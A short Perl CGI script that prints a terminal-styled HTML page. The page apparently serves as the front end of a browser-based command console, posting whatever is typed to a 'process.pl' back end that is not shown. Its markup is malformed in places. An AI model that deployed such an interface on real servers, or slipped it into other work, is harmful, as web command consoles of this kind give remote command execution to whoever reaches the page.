#!/usr/bin/perl

#Set Header
print "Content-type: text/html\n\n";

#Define Style & Declare Javascripts
print '
<html>
<head>
        <script type="text/javascript"
                src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js">
        </script>
        
        <style type="text/css">
                body{ background:#000; color:#33FF00; font-family:monospace;
                        font-size:12px;}
                        
                form{ width:500px; }
                
                outputs { border:1px #33FF00 solid; width:500px; height:400px;
                        overflow:auto;}
        </style>
</head>

<div id="response">
        <!-- ajax command output will fill this div-->
</div>

        <script type="text/javascript">

        function register(){
                $.ajax({
                        type: "POST",
                        url: "../ey/process.pl",
                        data:         "command=" + document.getElementById("commandbox").value,
                        success: function(html){
                                $("#response").append(html+"<br/>");
                        }
                });
                
                }
                $("#commandline").submit(function() {
         register();
         return false;
         });
        </script>

<margin>
        <form action="" method="POST" style="background:#000; color:#33FF00;"
                                        id="commandline" onsubmit="register(); return false;">
                                        
                >><input type="text" name="command" id="commandbox"
                        style="background:#000; border:0px solid #33FF00; display:inline;
                        color:#33FF00; width:400px;">
                
                 <input type="button" name="submit" id="submit" style="background:#000;
                         border:0px solid #33FF00; color:#000;">
        </form>
</div>
';


#End Page
print "</body></html>";
